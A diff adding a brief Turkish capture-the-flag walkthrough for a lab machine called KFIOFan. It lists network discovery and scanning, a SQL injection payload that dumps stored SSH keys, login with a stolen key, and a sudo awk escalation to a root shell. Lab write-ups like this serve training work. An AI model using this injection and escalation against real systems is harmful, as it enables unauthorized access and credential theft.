@@ -1,0 +1,9 @@
+CTF KFIOFan: 1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.55 bulundu.
+2 - nmap -A 192.168.2.55
+3 - http://192.168.2.55, Users: bob, Coord: 48.483333 -0.266667 (Bob : Saint-Calais-du-Désert)
+4 - http://192.168.2.55/khosearch.php -> a%%" UNION SELECT * FROM ssh_keys;#
+5 - ssh -i id_rsa alice@192.168.2.55
+6 - sudo -l, https://gtfobins.github.io/gtfobins/awk/#sudo
+7 - sudo awk 'BEGIN {system("/bin/sh")}'
+8 - whoami
